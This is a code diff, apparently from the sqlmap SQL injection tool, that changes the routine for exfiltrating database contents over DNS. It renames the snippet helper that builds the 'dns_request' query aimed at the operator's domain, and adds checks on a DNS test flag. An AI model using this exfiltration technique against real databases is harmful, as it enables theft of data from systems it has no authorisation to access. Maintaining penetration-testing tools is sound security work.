@@ -17,7 +17,7 @@ from lib.core.common import cleanQuery
 from lib.core.common import dataToStdout
 from lib.core.common import decodeHexValue
 from lib.core.common import extractRegexResult
-from lib.core.common import getSPLSnippet
+from lib.core.common import getSPQLSnippet
 from lib.core.common import hashDBRetrieve
 from lib.core.common import hashDBWrite
 from lib.core.common import pushValue
@@ -52,7 +52,7 @@ def dnsUse(payload, expression):
 
     if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE):
         output = hashDBRetrieve(expression, checkConf=True)
-        if output and PARTIAL_VALUE_MARKER in output:
+        if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
             output = None
 
         if output is None:
@@ -68,9 +68,8 @@ def dnsUse(payload, expression):
                 nulledCastedField = agent.hexConvertField(nulledCastedField)
                 expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
 
-                expressionRequest = getSPLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
+                expressionRequest = getSPQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                 expressionUnescaped = unescaper.unescape(expressionRequest)
-
 
                 if Backend.isDbms(DBMS.MSSQL):
                     comment = queries[Backend.getIdentifiedDbms()].comment.query
@@ -96,9 +95,10 @@ def dnsUse(payload, expression):
 
         if output is not None:
             retVal = output
-            dataToStdout("[%s] [INFO] %s: %s\r\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))
-            if count > 0:
-                hashDBWrite(expression, output)
+            if kb.dnsTest is not None:
+                dataToStdout("[%s] [INFO] %s: %s\r\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))
+                if count > 0:
+                    hashDBWrite(expression, output)
 
         if not kb.bruteMode:
             debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
@@ -108,6 +108,5 @@ def dnsUse(payload, expression):
         warnMsg = "DNS data exfiltration method through SQL injection "
         warnMsg += "is currently not available for DBMS %s" % Backend.getIdentifiedDbms()
         singleTimeWarnMessage(warnMsg)
-        conf.dnsDomain = None
 
     return retVal
